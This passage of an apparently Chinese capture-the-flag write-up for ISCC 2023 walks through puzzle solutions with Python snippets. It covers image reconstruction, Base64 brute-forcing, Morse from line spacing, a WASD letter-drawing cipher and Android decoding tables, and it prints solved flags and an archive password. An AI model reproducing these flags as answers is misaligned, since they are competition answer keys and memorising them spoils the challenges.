+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">from</span><span style="color:#79B8FF"> PIL</span><span style="color:#F97583"> import</span><span style="color:#E1E4E8"> Image</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">80</span><span style="color:#E1E4E8">):</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">    input_file </span><span style="color:#F97583">=</span><span style="color:#F97583"> f</span><span style="color:#9ECBFF">"./dataset/</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">i</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">.txt"</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">    output_file </span><span style="color:#F97583">=</span><span style="color:#F97583"> f</span><span style="color:#9ECBFF">"./out/</span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">i</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">.png"</span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#F97583">    with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(input_file, </span><span style="color:#9ECBFF">"r"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">        data </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> f.readlines()</span></span>
+<span class="line" data-line="9"></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">    pixel_values </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> []</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> row </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> data:</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">        row </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> row.strip().split(</span><span style="color:#9ECBFF">" "</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">        pixel_values.extend([</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">float</span><span style="color:#E1E4E8">(x)) </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> x </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> row])</span></span>
+<span class="line" data-line="14"></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">    width </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 28</span></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">    height </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> len</span><span style="color:#E1E4E8">(pixel_values) </span><span style="color:#F97583">//</span><span style="color:#E1E4E8"> width</span></span>
+<span class="line" data-line="17"></span>
+<span class="line" data-line="18"><span style="color:#E1E4E8">    image </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Image.new(</span><span style="color:#9ECBFF">"L"</span><span style="color:#E1E4E8">, (width, height))</span></span>
+<span class="line" data-line="19"><span style="color:#E1E4E8">    image.putdata(pixel_values)</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">    image.save(output_file)</span></span></code></pre>
+<p>然后直接在爆破后的结果中搜索 <code>ISCC</code> 进行 <code>4</code> 次 <code>Base64</code> 编码后的字符 <code>VlRGY</code> 即可找到正确的字符串（记得手动再去解码四次</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> string</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> itertools</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> contextlib</span></span>
+<span class="line" data-line="4"></span>
+<span class="line" data-line="5"><span style="color:#79B8FF">list</span><span style="color:#F97583"> =</span><span style="color:#9ECBFF"> '859 685 853 876 852 859 856 638 851 687 688 851 857 873 899 660 854 682 669 874 854 878 828 669 822 633 899 685 859 685 878 843 859 682 802 662 825 878 828 854 853 687 663 859 825 855 853 680 852 859 828 874 859 682 870 840 851 682 878 851 825 859 870 877 859 685 828 859 875 859 875 873 853 687 859 680 686 689 894 847'</span><span style="color:#E1E4E8">.split(</span><span style="color:#9ECBFF">" "</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#F97583">def</span><span style="color:#B392F0"> has_visible_bytes</span><span style="color:#E1E4E8">(input_bytes):</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">   return</span><span style="color:#79B8FF"> all</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">bytes</span><span style="color:#E1E4E8">([b]).decode() </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> (string.ascii_letters </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> string.digits </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> '=+/'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> b </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> input_bytes)</span></span>
+<span class="line" data-line="9"></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">digits </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "0123456789"</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> permutation </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> itertools.permutations(digits):</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">   maketrans </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> str</span><span style="color:#E1E4E8">.maketrans(digits, </span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">.join(permutation))</span></span>
+<span class="line" data-line="13"><span style="color:#F97583">   with</span><span style="color:#E1E4E8"> contextlib.suppress(</span><span style="color:#79B8FF">Exception</span><span style="color:#E1E4E8">):</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">       plain_text </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> bytes</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">(i.translate(maketrans)) </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> list</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="15"><span style="color:#F97583">       if</span><span style="color:#E1E4E8"> has_visible_bytes(plain_text):</span></span>
+<span class="line" data-line="16"><span style="color:#79B8FF">           print</span><span style="color:#E1E4E8">(plain_text)</span></span></code></pre>
+<h3 id="汤姆历险记">汤姆历险记</h3>
+<p>文件尾提取得到一段字符串，<code>foremost</code> 分理出一个加密压缩包，对字符串进行字频分析得到解压密码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>{yasuobpwrd91702!@$%^&#x26;*}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230605094401745.png" alt="image-20230605094401745"></p>
+<p>解压后得到一段文章，我们发现行间距不一样。有 <code>1倍</code> 行距，有 <code>1.5倍</code>行距，我们尝试转摩斯电码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>... -. -.. --. .- -.- . .-</span></span>
+<span class="line" data-line="2"><span>// sndgakea</span></span></code></pre>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230605094544594.png" alt="image-20230605094544594"></p>
+<p>然后再根据消息传递的脚本进行对照即可</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#E1E4E8">dictionary </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'./dictionary.txt'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'r'</span><span style="color:#E1E4E8">).read().split(</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)[:</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">]</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">dict1 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {}</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> pair </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> dictionary:</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">    key, value </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> pair.split(</span><span style="color:#9ECBFF">':'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">    dict1[key] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> value</span></span>
+<span class="line" data-line="6"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(dict1)</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">message</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">"ISCC</span><span style="color:#79B8FF">{sndgakea}</span><span style="color:#9ECBFF">"</span></span>
+<span class="line" data-line="8"></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(dict1.get(i),</span><span style="color:#FFAB70">end</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">if</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> dict1 </span><span style="color:#F97583">else</span><span style="color:#79B8FF"> print</span><span style="color:#E1E4E8">(i,</span><span style="color:#FFAB70">end</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> message ]</span></span></code></pre>
+<h3 id="人生之路">人生之路</h3>
+<blockquote>
+<p>人生之路充满着迷茫，也许成功的密码就在脚下，也许需要我们行走四方，也许我们旅途的记录会发生整体漂移，也许我们已经记不清走了多少路，分不清旅途的方向（flag以大写字母组成）。</p>
+<p>提示1：windows下大图标模式查看，成功的密码就在脚下！</p>
+</blockquote>
+<p>题目太抽象了，最后根据提示发现解压密码就是图片文件名 <code>人生之路.jpeg</code>，将解压后得到如下字符串</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>sOpXhOpXsO pOhXsOhXpO pOhOsO pOhOsO pXhXpXsXhXsX sOpOhOpXsO hOsO hOlOsOhXpO hOlOsOhXpOsOhX pOhOsO hOsOlO sOpOhOpXsO hOlOsOhOpO sOpOhXsOpOhXsO hOsO sOpXhOpXsO hsXlsXhpXhX pOlOsOhOhsX hOlOsOhXpO hOsO sXhXsXpXhXpX </span></span></code></pre>
+<p>结合题目描述中的 <code>行走四方</code>，通过凯撒移位到包含 <code>wasd</code> 的密文</p>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230605100811734.png" alt="image-20230605100811734"></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>Z:2，I:1，W:上，A:左，S:下，D:右，SD:右下</span></span></code></pre>
+<p>然后直接画出来就行了</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>ISCC{FLPRCUFDELIYQPL}</span></span></code></pre>
+<p>当然这里也有师傅整理出来的对照表</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>{</span></span>
+<span class="line" data-line="2"><span>    "saIsIwIdIwaIsdIsI": "A",</span></span>
+<span class="line" data-line="3"><span>    "sZwZdZsZaZdZsZaZ": "B",</span></span>
+<span class="line" data-line="4"><span>    "aZsZdZ": "C",</span></span>
+<span class="line" data-line="5"><span>    "sZwZdZsZaZ": "D",</span></span>
+<span class="line" data-line="6"><span>    "dZaZsIdZaZsIdZ": "E",</span></span>
+<span class="line" data-line="7"><span>    "dZaZsZaIdZ": "F",</span></span>
+<span class="line" data-line="8"><span>    "aZsZdZwIaI": "G",</span></span>
+<span class="line" data-line="9"><span>    "sZwIdZwIsZ": "H",</span></span>
+<span class="line" data-line="10"><span>    "dZaIsZaIdZ": "I",</span></span>
+<span class="line" data-line="11"><span>    "dZaIsZaI": "J",</span></span>
+<span class="line" data-line="12"><span>    "sZwIdIdwIsaIsdI": "K",</span></span>
+<span class="line" data-line="13"><span>    "sZdZ": "L",</span></span>
+<span class="line" data-line="14"><span>    "wZsdIwdIsZ": "M",</span></span>
+<span class="line" data-line="15"><span>    "wZsdZwZ": "N",</span></span>
+<span class="line" data-line="16"><span>    "sZdZwZaZ": "O",</span></span>
+<span class="line" data-line="17"><span>    "sZwZdZsIaZ": "P",</span></span>
+<span class="line" data-line="18"><span>    "aZwZdZsZsdI": "Q",</span></span>
+<span class="line" data-line="19"><span>    "sZwZdZsIaZdZsI": "R",</span></span>
+<span class="line" data-line="20"><span>    "aZsIdZsIaZ": "S",</span></span>
+<span class="line" data-line="21"><span>    "dZaIsZ": "T",</span></span>
+<span class="line" data-line="22"><span>    "sZdZwZ": "U",</span></span>
+<span class="line" data-line="23"><span>    "sIsdIdwIwI": "V",</span></span>
+<span class="line" data-line="24"><span>    "sdZwdZsdZwdZ": "W",</span></span>
+<span class="line" data-line="25"><span>    "sdZwaIwdIsaZ": "X",</span></span>
+<span class="line" data-line="26"><span>    "sdIwdIsaIsI": "Y",</span></span>
+<span class="line" data-line="27"><span>    "dZsaZdZ": "Z",</span></span>
+<span class="line" data-line="28"><span>    "aIsIaIdIsIdI": "{",</span></span>
+<span class="line" data-line="29"><span>    "dIsIdIaIsIaI": "}"</span></span>
+<span class="line" data-line="30"><span>}</span></span></code></pre>
+<h2 id="mobile">Mobile</h2>
+<h3 id="nojava">NOJAVA</h3>
+<blockquote>
+<p>NOT JAVA BUT</p>
+</blockquote>
+<p><img src="https://img.5ime.cn/iscc-2023/image-20230509213405844.png" alt="image-20230509213405844"></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#E1E4E8">text </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'jeYejfjijjYfeYfYjjiZeieZ'</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">binary </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">.join(</span><span style="color:#79B8FF">format</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">ord</span><span style="color:#E1E4E8">(i), </span><span style="color:#9ECBFF">'08b'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> text)</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">a </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [binary[i:i</span><span style="color:#F97583">+</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">len</span><span style="color:#E1E4E8">(binary), </span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">)]</span></span>
+<span class="line" data-line="4"></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">payload </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ""</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">conversion_table </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#9ECBFF">"1001"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"10"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"0110"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"01"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1010"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"11"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"0101"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"00"</span><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="7"></span>
+<span class="line" data-line="8"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> a:</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> conversion_table:</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">        payload </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> conversion_table[i]</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">    else</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="12"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"waaa"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="13"></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">result </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">.join(</span><span style="color:#79B8FF">chr</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">(payload[i:i</span><span style="color:#F97583">+</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">], </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">)) </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">len</span><span style="color:#E1E4E8">(payload), </span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">))</span></span>
+<span class="line" data-line="15"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"ISCC</span><span style="color:#79B8FF">{{{</span><span style="color:#E1E4E8">result</span><span style="color:#79B8FF">}}}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span></code></pre>
+<h3 id="manyjni">ManyJNI</h3>
+<blockquote>
+<p>可以绕过，但不能跳过！</p>
+</blockquote>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#E1E4E8">dic </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#9ECBFF">"1463495029.1088610877"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"+"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1049530879.4255690777"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"#"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2862766292.2381007417"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"$"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="2"><span style="color:#9ECBFF">       "3330444070.1174262214"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">","</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2227920669.2827401366"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"_"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1579951362.2846238576"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"8"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"368955456.3265704134"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"T"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="3"><span style="color:#9ECBFF">       "2696190145.613662970"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"("</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3872134833.1068749546"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"m"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"891426205.2766473378"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"/"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1519023352.105877999"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"j"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="4"><span style="color:#9ECBFF">       "2477809142.443877620"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"["</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2647754101.2230120467"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"`"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3075111042.1323776342"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"i"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"986806734.2777299023"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"."</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="5"><span style="color:#9ECBFF">       "3896053831.4135235691"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"?"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1184712308.807098365"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"I"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"4075828588.429489377"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"M"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2429787593.619384622"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"l"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="6"><span style="color:#9ECBFF">       "881206442.1709247634"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"]"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1083538065.1130340170"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"a"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"4023341693.1586698450"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"6"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"155280819.3054501475"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"W"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="7"><span style="color:#9ECBFF">       "99771100.1051999332"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"9"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"4232898851.3300692563"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">")"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"64956337.4234499210"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"1"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2870232400.3722498303"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="8"><span style="color:#9ECBFF">       "2841218066.780431097"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"e"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"132800239.3878689771"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"w"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2156232310.2823971181"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"k"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1808290711.212509551"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"7"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="9"><span style="color:#9ECBFF">       "696150085.2220172189"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"p"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3713618273.3259647236"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"q"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3121040253.2415880190"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"u"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2858698525.3991735450"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"z"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="10"><span style="color:#9ECBFF">       "2547227671.698153515"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">";"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"654785657.4006927810"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"n"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3711461495.3008240604"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"&#x3C;"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3581263639.1952078211"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"f"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="11"><span style="color:#9ECBFF">       "3164894139.2581098102"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"y"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3160675335.657981347"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"x"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1158103192.2450550443"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"~"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1236282010.4060431406"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"A"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="12"><span style="color:#9ECBFF">       "4027068562.440012179"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"c"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"351048083.1823512614"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"o"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1462318326.3226159060"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"C"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2954653653.1618611175"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"P"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="13"><span style="color:#9ECBFF">       "701073028.312955233"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"%"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"666315003.3369729975"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"4"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2853626980.607086523"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"="</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"19734539.2637167118"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"@"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="14"><span style="color:#9ECBFF">       "4120373985.112157582"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"J"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"2302105109.2843567652"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"L"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1392500071.2693188089"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"^"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"709910699.3712210805"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"s"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="15"><span style="color:#9ECBFF">       "3113384841.1999610280"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">":"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"1964704696.30454558"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"X"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"3016651642.1304626590"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"E"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"924745076.1085575287"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"3"</span><span style="color:#E1E4E8">,</span></span>
